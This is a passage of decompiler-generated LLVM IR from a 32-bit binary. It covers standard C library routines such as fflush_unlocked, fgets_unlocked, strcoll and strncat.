  %v0_80577b9 = load i32, i32* @global_var_80624a4.593, align 4
  %v8_80577c1 = icmp eq i32 %v0_80577b9, 1
  %v1_80577c2 = icmp eq i1 %v8_80577c1, false
  br i1 %v1_80577c2, label %dec_label_pc_8057859, label %dec_label_pc_80577c8

dec_label_pc_80577c8:                             ; preds = %entry
  %v0_80577c8 = load i32, i32* @global_var_80624a8.594, align 8
  %tmp29 = icmp slt i32 %v0_80577c8, 1
  br i1 %tmp29, label %dec_label_pc_8057859, label %dec_label_pc_80577d5

dec_label_pc_80577d5:                             ; preds = %dec_label_pc_80577c8
  store i32 0, i32* @esi, align 4
  %v2_80577e2 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_80577e2, i32* @eax, align 4
  %v2_80577e7 = call i32 @__pthread_return_void(i32 %v2_80577e2, i32 134567263)
  %v1_80577f3 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805e20c.486 to i32))
  %v0_80577f8 = load i32, i32* bitcast (i32** @global_var_805e208.488 to i32*), align 8
  store i32 %v0_80577f8, i32* %edx.global-to-local, align 4
  %v1_805783a3 = icmp eq i32 %v0_80577f8, 0
  %v1_805783c10 = icmp eq i1 %v1_805783a3, false
  br i1 %v1_805783c10, label %dec_label_pc_8057803, label %dec_label_pc_805783e

dec_label_pc_8057803:                             ; preds = %dec_label_pc_80577d5, %dec_label_pc_8057838
  %v1_805780314.in = phi i32 [ %v0_8057838, %dec_label_pc_8057838 ], [ %v0_80577f8, %dec_label_pc_80577d5 ]
  %v1_805780314 = inttoptr i32 %v1_805780314.in to i16*
  %v2_8057803 = load i16, i16* %v1_805780314, align 2
  %v1_8057806 = add i32 %v1_805780314.in, 32
  %v2_8057806 = inttoptr i32 %v1_8057806 to i32*
  %v3_8057806 = load i32, i32* %v2_8057806, align 4
  store i32 %v3_8057806, i32* @ebx, align 4
  %v1_8057809 = and i16 %v2_8057803, -32720
  %v6_805780e = icmp eq i16 %v1_8057809, 48
  br i1 %v6_805780e, label %dec_label_pc_8057817, label %dec_label_pc_8057813

dec_label_pc_8057813:                             ; preds = %dec_label_pc_8057803
  store i32 %v1_805780314.in, i32* @esi, align 4
  br label %dec_label_pc_8057838

dec_label_pc_8057817:                             ; preds = %dec_label_pc_8057803
  %v0_8057817 = load i32, i32* @esi, align 4
  %v1_8057817 = icmp eq i32 %v0_8057817, 0
  %v1_8057819 = icmp eq i1 %v1_8057817, false
  br i1 %v1_8057819, label %dec_label_pc_8057823, label %dec_label_pc_805781b

dec_label_pc_805781b:                             ; preds = %dec_label_pc_8057817
  store i32 %v3_8057806, i32* bitcast (i32** @global_var_805e208.488 to i32*), align 8
  br label %dec_label_pc_8057826

dec_label_pc_8057823:                             ; preds = %dec_label_pc_8057817
  %v2_8057823 = add i32 %v0_8057817, 32
  %v3_8057823 = inttoptr i32 %v2_8057823 to i32*
  store i32 %v3_8057806, i32* %v3_8057823, align 4
  %v0_8057826.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057826

dec_label_pc_8057826:                             ; preds = %dec_label_pc_805781b, %dec_label_pc_8057823
  %v0_805782f = phi i32 [ %v1_805780314.in, %dec_label_pc_805781b ], [ %v0_8057826.pre, %dec_label_pc_8057823 ]
  %v1_8057826 = add i32 %v0_805782f, 1
  %v2_8057826 = inttoptr i32 %v1_8057826 to i8*
  %v3_8057826 = load i8, i8* %v2_8057826, align 1
  %v4_8057826 = and i8 %v3_8057826, 32
  %v5_8057826 = icmp eq i8 %v4_8057826, 0
  br i1 %v5_8057826, label %dec_label_pc_8057838, label %dec_label_pc_805782c

dec_label_pc_805782c:                             ; preds = %dec_label_pc_8057826
  %v1_8057830 = call i32 @free(i32 %v0_805782f)
  br label %dec_label_pc_8057838

dec_label_pc_8057838:                             ; preds = %dec_label_pc_8057826, %dec_label_pc_8057813, %dec_label_pc_805782c
  %v0_8057838 = load i32, i32* @ebx, align 4
  store i32 %v0_8057838, i32* %edx.global-to-local, align 4
  %v1_805783a = icmp eq i32 %v0_8057838, 0
  %v1_805783c = icmp eq i1 %v1_805783a, false
  br i1 %v1_805783c, label %dec_label_pc_8057803, label %dec_label_pc_805783e

dec_label_pc_805783e:                             ; preds = %dec_label_pc_8057838, %dec_label_pc_80577d5
  store i32 %v2_80577e2, i32* @eax, align 4
  %v2_8057847 = call i32 @__pthread_return_void(i32 %v2_80577e2, i32 1)
  store i32 0, i32* @global_var_80624a8.594, align 8
  %v0_8057859.pre = load i32, i32* @global_var_80624a4.593, align 4
  br label %dec_label_pc_8057859

dec_label_pc_8057859:                             ; preds = %dec_label_pc_80577c8, %entry, %dec_label_pc_805783e
  %v0_8057859 = phi i32 [ %v0_80577b9, %dec_label_pc_80577c8 ], [ %v0_80577b9, %entry ], [ %v0_8057859.pre, %dec_label_pc_805783e ]
  %v1_805785e = add i32 %v0_8057859, -1
  store i32 %v1_805785e, i32* @global_var_80624a4.593, align 4
  store i32 %v2_80577a3, i32* @eax, align 4
  %v2_805786d = call i32 @__pthread_return_void(i32 %v2_80577a3, i32 1)
  ret i32 %v2_805786d

; uselistorder directives
  uselistorder i32 %v0_8057838, { 1, 2, 0 }
  uselistorder i32 %v1_805780314.in, { 2, 1, 0, 3 }
  uselistorder i32 %v0_80577b9, { 1, 2, 0 }
  uselistorder i32 (i32)* @free, { 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 1, 6, 5, 4, 3, 2, 21, 20, 7, 19, 0 }
  uselistorder label %dec_label_pc_8057859, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057838, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057826, { 1, 0 }
  uselistorder label %dec_label_pc_8057803, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_8057878 = load i32, i32* @ebp, align 4
  store i32 0, i32* @ebp, align 4
  %v0_805787b = load i32, i32* @edi, align 4
  %v0_805787c = load i32, i32* @esi, align 4
  %v0_805787d = load i32, i32* @ebx, align 4
  %v4_8057881 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8057881, i32* @ebx, align 4
  %v10_8057885 = icmp eq i16* %arg1, inttoptr (i32 134603272 to i16*)
  br i1 %v10_8057885, label %dec_label_pc_8057899, label %dec_label_pc_805788d

dec_label_pc_805788d:                             ; preds = %entry
  %v2_805788d = icmp eq i16* %arg1, null
  store i32 256, i32* @ebp, align 4
  %v1_8057893 = icmp eq i1 %v2_805788d, false
  br i1 %v1_8057893, label %dec_label_pc_8057991, label %dec_label_pc_8057899

dec_label_pc_8057899:                             ; preds = %dec_label_pc_805788d, %entry
  store i32 0, i32* @edi, align 4
  %v2_80578a6 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80578a6, i32* @ebx, align 4
  %v2_80578ab = call i32 @__pthread_return_void(i32 %v2_80578a6, i32 134567263)
  %v1_80578b7 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805e224.487 to i32))
  %v0_80578bc = load i32, i32* @global_var_80624a4.593, align 4
  store i32 ptrtoint (i32* @global_var_805e224.487 to i32), i32* @ecx, align 4
  %v1_80578c3 = add i32 %v0_80578bc, 1
  store i32 %v1_80578c3, i32* @eax, align 4
  store i32 %v1_80578c3, i32* @global_var_80624a4.593, align 4
  %v2_80578cc = call i32 @__pthread_return_void(i32 %v2_80578a6, i32 1)
  store i32 %v2_80578cc, i32* @eax, align 4
  %v2_80578df = call i32 @__pthread_return_void(i32 %v2_80578a6, i32 134567263)
  %v1_80578eb = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805e20c.486 to i32))
  %v0_80578f0 = load i32, i32* bitcast (i32** @global_var_805e208.488 to i32*), align 8
  store i32 %v0_80578f0, i32* @esi, align 4
  store i32 ptrtoint (i32* @global_var_805e20c.486 to i32), i32* @eax, align 4
  %v2_80578fb = call i32 @__pthread_return_void(i32 %v2_80578a6, i32 1)
  %v0_80579821 = load i32, i32* @esi, align 4
  %v1_80579822 = icmp eq i32 %v0_80579821, 0
  %v1_80579849 = icmp eq i1 %v1_80579822, false
  br i1 %v1_80579849, label %dec_label_pc_8057905, label %dec_label_pc_805798a

dec_label_pc_8057905:                             ; preds = %dec_label_pc_8057899, %dec_label_pc_805797f
  %v0_8057913 = phi i32 [ %v3_805797f, %dec_label_pc_805797f ], [ %v0_80579821, %dec_label_pc_8057899 ]
  %v1_8057905 = inttoptr i32 %v0_8057913 to i8*
  %v2_8057905 = load i8, i8* %v1_8057905, align 1
  %v3_8057905 = and i8 %v2_8057905, 64
  %v4_8057905 = icmp eq i8 %v3_8057905, 0
  br i1 %v4_8057905, label %dec_label_pc_805797f, label %dec_label_pc_805790a

dec_label_pc_805790a:                             ; preds = %dec_label_pc_8057905
  %v0_805790a = load i32, i32* @global_var_805e23c.595, align 4
  %v9_805790a = icmp eq i32 %v0_805790a, 2
  br i1 %v9_805790a, label %dec_label_pc_8057932, label %dec_label_pc_8057913

dec_label_pc_8057913:                             ; preds = %dec_label_pc_805790a
  %v1_8057913 = add i32 %v0_8057913, 56
  store i32 %v1_8057913, i32* @ebx, align 4
  store i32 %v2_80578a6, i32* @eax, align 4
  %v2_8057922 = call i32 @__pthread_return_void(i32 %v2_80578a6, i32 134567263)
  %v0_8057927 = load i32, i32* @ebx, align 4
  %v1_805792a = call i32 @__pthread_return_0(i32 %v0_8057927)
  %v0_8057932.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8057932

dec_label_pc_8057932:                             ; preds = %dec_label_pc_805790a, %dec_label_pc_8057913
  %v0_8057945 = phi i32 [ %v0_8057913, %dec_label_pc_805790a ], [ %v0_8057932.pre, %dec_label_pc_8057913 ]
  %v1_8057932 = inttoptr i32 %v0_8057945 to i32*
  %v2_8057932 = load i32, i32* %v1_8057932, align 4
  %v1_8057934 = load i32, i32* @ebp, align 4
  %v2_8057934 = or i32 %v1_8057934, %v2_8057932
  %v1_8057936 = and i32 %v2_8057934, 832
  %v2_805793b = icmp eq i32 %v1_8057936, 320
  %v1_8057940 = icmp eq i1 %v2_805793b, false
  br i1 %v1_8057940, label %dec_label_pc_8057965, label %dec_label_pc_8057942

dec_label_pc_8057942:                             ; preds = %dec_label_pc_8057932
  %v1_8057946 = call i32 @__stdio_wcommit(i32 %v0_8057945)
  %v1_805794e = icmp eq i32 %v1_8057946, 0
  br i1 %v1_805794e, label %dec_label_pc_8057957, label %dec_label_pc_8057952

dec_label_pc_8057952:                             ; preds = %dec_label_pc_8057942
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_8057965

dec_label_pc_8057957:                             ; preds = %dec_label_pc_8057942
  %v0_8057957 = load i32, i32* @esi, align 4
  %v1_8057957 = add i32 %v0_8057957, 8
  %v2_8057957 = inttoptr i32 %v1_8057957 to i32*
  %v3_8057957 = load i32, i32* %v2_8057957, align 4
  %v2_805795a = add i32 %v0_8057957, 28
  %v3_805795a = inttoptr i32 %v2_805795a to i32*
  store i32 %v3_8057957, i32* %v3_805795a, align 4
  %v0_805795d = load i32, i32* @esi, align 4
  %v1_805795d = inttoptr i32 %v0_805795d to i32*
  %v2_805795d = load i32, i32* %v1_805795d, align 4
  %v2_805795d.tr = trunc i32 %v2_805795d to i16
  %v1_8057962 = and i16 %v2_805795d.tr, -65
  %v3_8057962 = inttoptr i32 %v0_805795d to i16*
  store i16 %v1_8057962, i16* %v3_8057962, align 2
  br label %dec_label_pc_8057965

dec_label_pc_8057965:                             ; preds = %dec_label_pc_8057932, %dec_label_pc_8057952, %dec_label_pc_8057957
  %v0_8057965 = load i32, i32* @global_var_805e23c.595, align 4
  %v9_8057965 = icmp eq i32 %v0_8057965, 2
  br i1 %v9_8057965, label %dec_label_pc_805797f, label %dec_label_pc_805796e

dec_label_pc_805796e:                             ; preds = %dec_label_pc_8057965
  store i32 %v2_80578a6, i32* @eax, align 4
  %v2_8057977 = call i32 @__pthread_return_void(i32 %v2_80578a6, i32 1)
  br label %dec_label_pc_805797f

dec_label_pc_805797f:                             ; preds = %dec_label_pc_8057965, %dec_label_pc_8057905, %dec_label_pc_805796e
  %v0_805797f = load i32, i32* @esi, align 4
  %v1_805797f = add i32 %v0_805797f, 32
  %v2_805797f = inttoptr i32 %v1_805797f to i32*
  %v3_805797f = load i32, i32* %v2_805797f, align 4
  store i32 %v3_805797f, i32* @esi, align 4
  %v1_8057982 = icmp eq i32 %v3_805797f, 0
  %v1_8057984 = icmp eq i1 %v1_8057982, false
  br i1 %v1_8057984, label %dec_label_pc_8057905, label %dec_label_pc_805798a

dec_label_pc_805798a:                             ; preds = %dec_label_pc_805797f, %dec_label_pc_8057899
  %v0_805798a = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_80579bb

dec_label_pc_8057991:                             ; preds = %dec_label_pc_805788d
  store i32 0, i32* @edi, align 4
  %tmp23 = bitcast i16* %arg1 to i8*
  %v3_8057993 = load i8, i8* %tmp23, align 1
  %v4_8057993 = and i8 %v3_8057993, 64
  %v5_8057993 = icmp eq i8 %v4_8057993, 0
  br i1 %v5_8057993, label %dec_label_pc_80579bb, label %dec_label_pc_8057998

dec_label_pc_8057998:                             ; preds = %dec_label_pc_8057991
  store i32 -1, i32* @edi, align 4
  %v1_805799f = call i32 @__stdio_wcommit(i32 %v4_8057881)
  %v1_80579a7 = icmp eq i32 %v1_805799f, 0
  %v1_80579a9 = icmp eq i1 %v1_80579a7, false
  br i1 %v1_80579a9, label %dec_label_pc_80579bb, label %dec_label_pc_80579ab

dec_label_pc_80579ab:                             ; preds = %dec_label_pc_8057998
  %v2_80579ab = add i32 %v4_8057881, 8
  %v3_80579ab = inttoptr i32 %v2_80579ab to i32*
  %v4_80579ab = load i32, i32* %v3_80579ab, align 4
  store i32 0, i32* @edi, align 4
  %v3_80579b0 = add i32 %v4_8057881, 28
  %v4_80579b0 = inttoptr i32 %v3_80579b0 to i32*
  store i32 %v4_80579ab, i32* %v4_80579b0, align 4
  %tmp24 = bitcast i16* %arg1 to i32*
  %v3_80579b3 = load i32, i32* %tmp24, align 4
  %v3_80579b3.tr = trunc i32 %v3_80579b3 to i16
  %v1_80579b8 = and i16 %v3_80579b3.tr, -65
  store i16 %v1_80579b8, i16* %arg1, align 2
  br label %dec_label_pc_80579bb

dec_label_pc_80579bb:                             ; preds = %dec_label_pc_8057998, %dec_label_pc_8057991, %dec_label_pc_805798a, %dec_label_pc_80579ab
  %v0_80579be = load i32, i32* @edi, align 4
  store i32 %v0_805787d, i32* @ebx, align 4
  store i32 %v0_805787c, i32* @esi, align 4
  store i32 %v0_805787b, i32* @edi, align 4
  store i32 %v0_8057878, i32* @ebp, align 4
  ret i32 %v0_80579be

; uselistorder directives
  uselistorder i32 %v3_805797f, { 1, 2, 0 }
  uselistorder i32 %v2_80578a6, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_805e208.488 to i32*), { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_805e20c.486 to i32), { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* @global_var_80624a4.593, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 (i32)* @__pthread_return_0, { 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 3, 29, 31, 30, 9, 2, 1, 0, 6, 5, 7, 8, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_805e224.487 to i32), { 1, 3, 4, 5, 9, 2, 6, 0, 7, 8 }
  uselistorder i32 (i32, i32)* @__pthread_return_void, { 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 1, 0, 51, 50, 55, 54, 53, 52, 11, 10, 5, 4, 3, 2, 7, 6, 9, 8 }
  uselistorder i32 134567263, { 18, 19, 2, 20, 3, 4, 21, 22, 5, 23, 6, 7, 8, 25, 26, 27, 28, 29, 30, 0, 9, 10, 11, 12, 13, 14, 15, 16, 1, 24, 17 }
  uselistorder i16* %arg1, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_80579bb, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805797f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057965, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8057932, { 1, 0 }
  uselistorder label %dec_label_pc_8057905, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_80579c8 = load i32, i32* @ebp, align 4
  %v4_80579d3 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80579d3, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_80579d3, i32* @ebx, align 4
  %tmp16 = icmp slt i32 %arg2, 1
  %tmp17 = icmp eq i1 %tmp16, false
  br i1 %tmp17, label %dec_label_pc_8057a19.preheader, label %dec_label_pc_8057a25

dec_label_pc_8057a19.preheader:                   ; preds = %entry
  %v1_8057a1918 = add i32 %arg2, -1
  %v8_8057a1922 = icmp eq i32 %v1_8057a1918, 0
  store i32 %v1_8057a1918, i32* @esi, align 4
  %v1_8057a1a24 = icmp eq i1 %v8_8057a1922, false
  br i1 %v1_8057a1a24, label %dec_label_pc_80579e3, label %dec_label_pc_8057a1c

dec_label_pc_80579e3:                             ; preds = %dec_label_pc_8057a19.preheader, %dec_label_pc_8057a17.dec_label_pc_8057a19_crit_edge.dec_label_pc_80579e3_crit_edge
  %v0_80579e3 = phi i32 [ %v0_80579e3.pre, %dec_label_pc_8057a17.dec_label_pc_8057a19_crit_edge.dec_label_pc_80579e3_crit_edge ], [ %arg3, %dec_label_pc_8057a19.preheader ]
  %v1_80579e3 = add i32 %v0_80579e3, 16
  %v2_80579e3 = inttoptr i32 %v1_80579e3 to i32*
  %v3_80579e3 = load i32, i32* %v2_80579e3, align 4
  store i32 %v3_80579e3, i32* %eax.global-to-local, align 4
  %v2_80579e6 = add i32 %v0_80579e3, 24
  %v3_80579e6 = inttoptr i32 %v2_80579e6 to i32*
  %v4_80579e6 = load i32, i32* %v3_80579e6, align 4
  %v10_80579e6 = icmp ult i32 %v3_80579e3, %v4_80579e6
  %v1_80579e9 = icmp eq i1 %v10_80579e6, false
  br i1 %v1_80579e9, label %dec_label_pc_80579f9, label %dec_label_pc_80579eb

dec_label_pc_80579eb:                             ; preds = %dec_label_pc_80579e3
  %v1_80579eb = inttoptr i32 %v3_80579e3 to i8*
  %v2_80579eb = load i8, i8* %v1_80579eb, align 1
  %v3_80579eb = zext i8 %v2_80579eb to i32
  %v4_80579eb = load i32, i32* @edx, align 4
  %v5_80579eb = and i32 %v4_80579eb, -256
  %v6_80579eb = or i32 %v5_80579eb, %v3_80579eb
  store i32 %v6_80579eb, i32* @edx, align 4
  %v1_80579ed = add i32 %v3_80579e3, 1
  store i32 %v1_80579ed, i32* %eax.global-to-local, align 4
  %v2_80579ee = load i32, i32* @ebx, align 4
  %v3_80579ee = inttoptr i32 %v2_80579ee to i8*
  store i8 %v2_80579eb, i8* %v3_80579ee, align 1
  %v0_80579f0 = load i32, i32* @ebx, align 4
  %v1_80579f0 = add i32 %v0_80579f0, 1
  store i32 %v1_80579f0, i32* @ebx, align 4
  %v0_80579f1 = load i32, i32* @edx, align 4
  %v1_80579f1 = trunc i32 %v0_80579f1 to i8
  %v10_80579f1 = icmp eq i8 %v1_80579f1, 10
  %v0_80579f4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80579f4 = load i32, i32* @ebp, align 4
  %v2_80579f4 = add i32 %v1_80579f4, 16
  %v3_80579f4 = inttoptr i32 %v2_80579f4 to i32*
  store i32 %v0_80579f4, i32* %v3_80579f4, align 4
  br i1 %v10_80579f1, label %dec_label_pc_8057a1c, label %dec_label_pc_8057a17.dec_label_pc_8057a19_crit_edge

dec_label_pc_80579f9:                             ; preds = %dec_label_pc_80579e3
  %v0_80579fd = call i32 @getc_unlocked()
  %v1_80579fd = trunc i32 %v0_80579fd to i8
  store i32 %v0_80579fd, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v0_80579fd, 16777216
  %tmp = icmp eq i32 %sext, -16777216
  %v1_8057a08 = icmp eq i1 %tmp, false
  br i1 %v1_8057a08, label %dec_label_pc_8057a17, label %dec_label_pc_8057a0a

dec_label_pc_8057a0a:                             ; preds = %dec_label_pc_80579f9
  %v0_8057a0a = load i32, i32* @ebp, align 4
  %v1_8057a0a = inttoptr i32 %v0_8057a0a to i8*
  %v2_8057a0a = load i8, i8* %v1_8057a0a, align 1
  %v3_8057a0a = and i8 %v2_8057a0a, 8
  %v4_8057a0a = icmp eq i8 %v3_8057a0a, 0
  br i1 %v4_8057a0a, label %dec_label_pc_8057a1c, label %dec_label_pc_8057a25

dec_label_pc_8057a17:                             ; preds = %dec_label_pc_80579f9
  %v3_8057a12 = load i32, i32* @ebx, align 4
  %v4_8057a12 = inttoptr i32 %v3_8057a12 to i8*
  store i8 %v1_80579fd, i8* %v4_8057a12, align 1
  %v0_8057a14 = load i32, i32* @ebx, align 4
  %v1_8057a14 = add i32 %v0_8057a14, 1
  store i32 %v1_8057a14, i32* @ebx, align 4
  %v11_8057a15 = icmp eq i8 %v1_80579fd, 10
  br i1 %v11_8057a15, label %dec_label_pc_8057a1c, label %dec_label_pc_8057a17.dec_label_pc_8057a19_crit_edge

dec_label_pc_8057a17.dec_label_pc_8057a19_crit_edge: ; preds = %dec_label_pc_80579eb, %dec_label_pc_8057a17
  %v0_8057a19.pre = load i32, i32* @esi, align 4
  %v1_8057a19 = add i32 %v0_8057a19.pre, -1
  %v8_8057a19 = icmp eq i32 %v1_8057a19, 0
  store i32 %v1_8057a19, i32* @esi, align 4
  %v1_8057a1a = icmp eq i1 %v8_8057a19, false
  br i1 %v1_8057a1a, label %dec_label_pc_8057a17.dec_label_pc_8057a19_crit_edge.dec_label_pc_80579e3_crit_edge, label %dec_label_pc_8057a1c

dec_label_pc_8057a17.dec_label_pc_8057a19_crit_edge.dec_label_pc_80579e3_crit_edge: ; preds = %dec_label_pc_8057a17.dec_label_pc_8057a19_crit_edge
  %v0_80579e3.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_80579e3

dec_label_pc_8057a1c:                             ; preds = %dec_label_pc_8057a19.preheader, %dec_label_pc_80579eb, %dec_label_pc_8057a17.dec_label_pc_8057a19_crit_edge, %dec_label_pc_8057a17, %dec_label_pc_8057a0a
  %v0_8057a1c = load i32, i32* @ebx, align 4
  %v1_8057a1c = load i32, i32* @edi, align 4
  %tmp26 = icmp ugt i32 %v0_8057a1c, %v1_8057a1c
  br i1 %tmp26, label %dec_label_pc_8057a20, label %dec_label_pc_8057a25

dec_label_pc_8057a20:                             ; preds = %dec_label_pc_8057a1c
  %v1_8057a20 = inttoptr i32 %v0_8057a1c to i8*
  store i8 0, i8* %v1_8057a20, align 1
  %v0_8057a2a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8057a27

dec_label_pc_8057a25:                             ; preds = %dec_label_pc_8057a1c, %dec_label_pc_8057a0a, %entry
  br label %dec_label_pc_8057a27

dec_label_pc_8057a27:                             ; preds = %dec_label_pc_8057a20, %dec_label_pc_8057a25
  %v0_8057a2a = phi i32 [ %v0_8057a2a.pre, %dec_label_pc_8057a20 ], [ 0, %dec_label_pc_8057a25 ]
  store i32 %v0_8057a2a, i32* %eax.global-to-local, align 4
  store i32 %v0_80579c8, i32* @ebp, align 4
  ret i32 %v0_8057a2a

; uselistorder directives
  uselistorder i32 %v0_8057a2a, { 1, 0 }
  uselistorder i32 %v0_8057a1c, { 1, 0 }
  uselistorder i32 %v1_8057a19, { 1, 0 }
  uselistorder i32 %v0_80579fd, { 0, 2, 1 }
  uselistorder i32 %v0_80579e3, { 1, 0 }
  uselistorder i8 10, { 0, 1, 2, 3, 4, 14, 5, 6, 15, 13, 7, 16, 8, 17, 9, 10, 11, 12, 18 }
  uselistorder label %dec_label_pc_8057a27, { 1, 0 }
  uselistorder label %dec_label_pc_8057a1c, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_8057a17.dec_label_pc_8057a19_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_80579e3, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_8057a36 = ptrtoint i8* %arg1 to i32
  %v4_8057a3e.pre = load i32, i32* @eax, align 4
  %v8_8057a3e.pre = load i1, i1* @df, align 1
  %v9_8057a3e = select i1 %v8_8057a3e.pre, i32 -1, i32 1
  br label %dec_label_pc_8057a3e

dec_label_pc_8057a3e:                             ; preds = %dec_label_pc_8057a42, %entry
  %v20_8057a3f = phi i32 [ %v23_8057a3f, %dec_label_pc_8057a42 ], [ %arg2, %entry ]
  %v4_8057a3e = phi i32 [ %v6_8057a3e, %dec_label_pc_8057a42 ], [ %v4_8057a3e.pre, %entry ]
  %v7_8057a3e = phi i32 [ %v10_8057a3e, %dec_label_pc_8057a42 ], [ %v4_8057a36, %entry ]
  %v1_8057a3e = inttoptr i32 %v7_8057a3e to i8*
  %v2_8057a3e = load i8, i8* %v1_8057a3e, align 1
  %v3_8057a3f = inttoptr i32 %v20_8057a3f to i8*
  %v4_8057a3f = load i8, i8* %v3_8057a3f, align 1
  %v15_8057a3f = icmp eq i8 %v2_8057a3e, %v4_8057a3f
  %v1_8057a40 = icmp eq i1 %v15_8057a3f, false
  br i1 %v1_8057a40, label %dec_label_pc_8057a4a, label %dec_label_pc_8057a42

dec_label_pc_8057a42:                             ; preds = %dec_label_pc_8057a3e
  %v3_8057a3e = zext i8 %v2_8057a3e to i32
  %v5_8057a3e = and i32 %v4_8057a3e, -256
  %v6_8057a3e = or i32 %v3_8057a3e, %v5_8057a3e
  %v23_8057a3f = add i32 %v20_8057a3f, %v9_8057a3e
  %v10_8057a3e = add i32 %v7_8057a3e, %v9_8057a3e
  %v4_8057a42 = icmp eq i8 %v2_8057a3e, 0
  %v1_8057a44 = icmp eq i1 %v4_8057a42, false
  br i1 %v1_8057a44, label %dec_label_pc_8057a3e, label %dec_label_pc_8057a4e

dec_label_pc_8057a4a:                             ; preds = %dec_label_pc_8057a3e
  br label %dec_label_pc_8057a4e

dec_label_pc_8057a4e:                             ; preds = %dec_label_pc_8057a42, %dec_label_pc_8057a4a
  %storemerge = phi i32 [ 1, %dec_label_pc_8057a4a ], [ 0, %dec_label_pc_8057a42 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_8057a3e, { 1, 2, 0 }
  uselistorder i32 %v9_8057a3e, { 1, 0 }
  uselistorder label %dec_label_pc_8057a4e, { 1, 0 }
}

define i32 @__GI_strncat() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8057a57 = load i32, i32* @esi, align 4
  store i32 %v0_8057a57, i32* %stack_var_-8, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v4_8057a5b = ptrtoint i8* %tmp5 to i32
  store i32 %v4_8057a5b, i32* %esi.global-to-local, align 4
  %v4_8057a63 = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_8057a67 = call i32 @_strlen(i8* %v4_8057a63)
  %v2_8057a69 = add i32 %tmp, -1
  store i32 %v2_8057a69, i32* %edi.global-to-local, align 4
  %v8_8057a6d13 = icmp eq i32 %tmp4, 0
  store i32 %tmp4, i32* %ecx.global-to-local, align 4
  br i1 %v8_8057a6d13, label %dec_label_pc_8057a78, label %dec_label_pc_8057a70.lr.ph

dec_label_pc_8057a70.lr.ph:                       ; preds = %entry
  %v4_8057a70.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_8057a70.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8057a70

dec_label_pc_8057a70:                             ; preds = %dec_label_pc_8057a70.lr.ph, %dec_label_pc_8057a70.dec_label_pc_8057a6d_crit_edge
  %v8_8057a70 = phi i1 [ %v8_8057a70.pre, %dec_label_pc_8057a70.lr.ph ], [ %v5_8057a71, %dec_label_pc_8057a70.dec_label_pc_8057a6d_crit_edge ]
  %v4_8057a70 = phi i32 [ %v4_8057a70.pre, %dec_label_pc_8057a70.lr.ph ], [ %v0_8057a72, %dec_label_pc_8057a70.dec_label_pc_8057a6d_crit_edge ]
  %v2_8057a7a15 = phi i32 [ %v2_8057a69, %dec_label_pc_8057a70.lr.ph ], [ %v7_8057a71, %dec_label_pc_8057a70.dec_label_pc_8057a6d_crit_edge ]
  %v0_8057a70 = load i32, i32* %esi.global-to-local, align 4
  %v1_8057a70 = inttoptr i32 %v0_8057a70 to i8*
  %v2_8057a70 = load i8, i8* %v1_8057a70, align 1
  %v3_8057a70 = zext i8 %v2_8057a70 to i32
  %v5_8057a70 = and i32 %v4_8057a70, -256
  %v6_8057a70 = or i32 %v5_8057a70, %v3_8057a70
  store i32 %v6_8057a70, i32* %eax.global-to-local, align 4
  %v9_8057a70 = select i1 %v8_8057a70, i32 -1, i32 1
